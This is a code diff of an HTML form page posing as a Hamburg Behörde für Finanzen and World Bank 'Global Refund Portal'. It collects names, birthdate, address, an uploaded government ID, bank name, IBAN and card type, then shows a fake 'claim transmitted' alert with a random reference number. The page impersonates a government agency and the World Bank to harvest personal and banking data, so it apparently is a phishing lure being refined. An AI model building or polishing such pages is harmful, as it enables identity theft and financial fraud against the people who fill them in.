@@ -18,31 +18,33 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            /* HD BACKGROUND NG HAMBURG RATHAUS CENTER */
-            background: linear-gradient(rgba(0, 48, 99, 0.7), rgba(0, 48, 99, 0.7)), 
-                        url('https://wikimedia.org');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
+            /* ELEGANT ARCHITECTURAL PATTERN - GUARANTEED TO WORK */
             background-color: var(--hamburg-blue);
+            background-image:  linear-gradient(30deg, #001a36 12%, transparent 12.5%, transparent 87%, #001a36 87.5%, #001a36),
+            linear-gradient(150deg, #001a36 12%, transparent 12.5%, transparent 87%, #001a36 87.5%, #001a36),
+            linear-gradient(30deg, #001a36 12%, transparent 12.5%, transparent 87%, #001a36 87.5%, #001a36),
+            linear-gradient(150deg, #001a36 12%, transparent 12.5%, transparent 87%, #001a36 87.5%, #001a36),
+            linear-gradient(60deg, #00254d 25%, transparent 25.5%, transparent 75%, #00254d 75%, #00254d),
+            linear-gradient(60deg, #00254d 25%, transparent 25.5%, transparent 75%, #00254d 75%, #00254d);
+            background-size: 80px 140px;
+            background-position: 0 0, 0 0, 40px 70px, 40px 70px, 0 0, 40px 70px;
             color: #333;
         }
 
-        .lang-bar { width: 100%; max-width: 750px; text-align: right; margin-bottom: 15px; }
-        .lang-bar select { padding: 10px 20px; border-radius: 25px; border: none; cursor: pointer; font-weight: bold; background: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-
         .form-container { 
-            background: rgba(255, 255, 255, 0.98); 
+            background: #ffffff; 
             width: 100%; 
             max-width: 750px; 
-            border-radius: 8px; 
-            box-shadow: 0 30px 60px rgba(0,0,0,0.6); 
+            border-radius: 4px; 
+            box-shadow: 0 40px 100px rgba(0,0,0,0.8); 
             overflow: hidden; 
-            border-top: 10px solid var(--hamburg-red);
-            backdrop-filter: blur(5px);
+            border-top: 12px solid var(--hamburg-red);
+            animation: fadeIn 0.8s ease-in;
         }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         
-        .header { padding: 45px 30px; text-align: center; background: white; border-bottom: 5px solid var(--hamburg-blue); }
+        .header { padding: 45px 30px; text-align: center; background: white; border-bottom: 6px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 24px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; }
         .header p { margin: 10px 0 0; color: var(--hamburg-red); font-weight: 700; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
         
@@ -50,30 +52,30 @@
         .section-box.active { display: block; }
         
         h2 { font-size: 17px; color: var(--hamburg-blue); margin-bottom: 25px; font-weight: 700; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        .input-group { margin-bottom: 22px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
         
         label { display: block; font-weight: 700; margin-bottom: 8px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
-        input, select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; background: #fff; box-sizing: border-box; font-size: 14px; }
+        input, select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 0; background: #fff; box-sizing: border-box; font-size: 14px; }
+        input:focus { border: 2px solid var(--hamburg-blue); outline: none; }
         input.error { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
         
         .btn-container { display: flex; justify-content: space-between; margin-top: 40px; }
-        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 18px 50px; cursor: pointer; font-size: 13px; font-weight: 800; text-transform: uppercase; border-radius: 4px; transition: 0.3s; }
-        button:hover { background-color: var(--hamburg-red); transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,0,0,0.4); }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 18px 50px; cursor: pointer; font-size: 13px; font-weight: 800; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background-color: var(--hamburg-red); transform: scale(1.02); }
 
         #loader { display: none; border: 6px solid #f3f3f3; border-top: 6px solid var(--hamburg-blue); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .footer { font-size: 10px; color: #555; text-align: center; padding: 30px; background: rgba(255,255,255,0.9); border-top: 1px solid #eee; }
+        .footer { font-size: 10px; color: #555; text-align: center; padding: 35px; background: #fafafa; border-top: 1px solid #eee; }
     </style>
 </head>
 <body>
 
-    <div class="lang-bar">
-        <select>
+    <div style="margin-bottom: 15px;">
+        <select style="padding: 10px; border-radius: 20px; border: none; font-weight: bold;">
             <option>🌐 English (International)</option>
-            <option>🇩🇪 Deutsch (Hamburg Office)</option>
+            <option>🇩🇪 Deutsch (Hamburg)</option>
         </select>
     </div>
 
@@ -84,10 +86,9 @@
                 <p>World Bank Partnership • Global Refund Portal</p>
             </div>
 
-            <!-- SECTION 1 -->
             <div id="section1" class="section-box active">
                 <h2>Section 1: Identity & Nationality</h2>
-                <div class="input-group">
+                <div style="margin-bottom: 22px;">
                     <div class="grid-3">
                         <div><label>Last Name *</label><input type="text" class="required"></div>
                         <div><label>First Name *</label><input type="text" class="required"></div>
@@ -95,49 +96,45 @@
                     </div>
                 </div>
 
-                <div class="grid-2">
-                    <div class="input-group"><label>Personal Email Address *</label><input type="email" class="required"></div>
-                    <div class="input-group"><label>Nationality *</label><input type="text" class="required"></div>
+                <div class="grid-2" style="margin-bottom: 22px;">
+                    <div><label>Personal Email Address *</label><input type="email" class="required"></div>
+                    <div><label>Nationality *</label><input type="text" class="required"></div>
                 </div>
 
-                <div class="input-group"><label>Residential Address *</label><input type="text" class="required"></div>
+                <div style="margin-bottom: 22px;"><label>Residential Address *</label><input type="text" class="required"></div>
 
-                <div class="grid-2">
-                    <div class="input-group"><label>Birthdate *</label><input type="date" class="required"></div>
-                    <div class="input-group"><label>Contact Number *</label><input type="text" class="required"></div>
+                <div class="grid-2" style="margin-bottom: 22px;">
+                    <div><label>Birthdate *</label><input type="date" class="required"></div>
+                    <div><label>Contact Number *</label><input type="text" class="required"></div>
                 </div>
 
-                <div class="input-group"><label>Upload Government-Issued ID *</label><input type="file" class="required"></div>
+                <div><label>Upload Government ID *</label><input type="file" class="required"></div>
 
                 <div class="btn-container">
                     <span></span>
-                    <button type="button" onclick="validateAndNext()">Continue to Step 2</button>
+                    <button type="button" onclick="validateAndNext()">Continue</button>
                 </div>
             </div>
 
-            <!-- SECTION 2 -->
             <div id="section2" class="section-box">
                 <h2>Section 2: Claim & Disbursement</h2>
-                <div class="grid-2">
-                    <div class="input-group"><label>Refund Amount (EUR) *</label><input type="number" class="required" placeholder="€ 0.00"></div>
-                    <div class="input-group"><label>Upload Official Proof *</label><input type="file" class="required" multiple></div>
+                <div class="grid-2" style="margin-bottom: 22px;">
+                    <div><label>Amount (EUR) *</label><input type="number" class="required" placeholder="€ 0.00"></div>
+                    <div><label>Upload Receipt *</label><input type="file" class="required" multiple></div>
                 </div>
-                <div class="input-group"><label>Banking Institution Name *</label><input type="text" class="required"></div>
-                <div class="grid-2">
-                    <div class="input-group"><label>Account Number / IBAN *</label><input type="text" class="required"></div>
-                    <div class="input-group"><label>Card Classification *</label><select class="required"><option value="">Choose...</option><option>Euro Debit Card</option><option>Global Credit Card</option></select></div>
+                <div style="margin-bottom: 22px;"><label>Bank Name *</label><input type="text" class="required"></div>
+                <div class="grid-2" style="margin-bottom: 22px;">
+                    <div><label>Account / IBAN *</label><input type="text" class="required"></div>
+                    <div><label>Card Type *</label><select class="required"><option value="">Select...</option><option>Debit</option><option>Credit</option></select></div>
                 </div>
                 <div id="loader"></div>
                 <div class="btn-container">
-                    <button type="button" onclick="prevSection()" style="background:#666">Return</button>
-                    <button type="button" id="submitBtn" onclick="validateAndSubmit()">Submit Official Claim</button>
+                    <button type="button" onclick="prevSection()" style="background:#666">Back</button>
+                    <button type="button" id="submitBtn" onclick="validateAndSubmit()">Submit Claim</button>
                 </div>
             </div>
         </form>
-        <div class="footer">
-            © 2024 Behörde für Finanzen • Hamburg, Germany <br> 
-            Strategic Operational Partner of the World Bank Group.
-        </div>
+        <div class="footer">© 2024 Behörde für Finanzen • Hamburg | Partner of World Bank Group</div>
     </div>
 
 <script>
@@ -155,10 +152,9 @@
             document.getElementById('submitBtn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             setTimeout(() => { 
-                const refNum = 'WB-HAM-' + Math.floor(100000 + Math.random() * 900000);
-                alert('SUCCESS!\n\nReference Number: ' + refNum + '\nYour claim has been transmitted to the Hamburg-World Bank Audit Unit.'); 
+                alert('SUCCESS!\n\nReference: WB-HAM-' + Math.floor(Math.random()*999999) + '\nClaim transmitted to World Bank Audit.'); 
                 location.reload(); 
-            }, 3500);
+            }, 3000);
         }
     }
     function prevSection() { document.getElementById('section2').classList.remove('active'); document.getElementById('section1').classList.add('active'); }
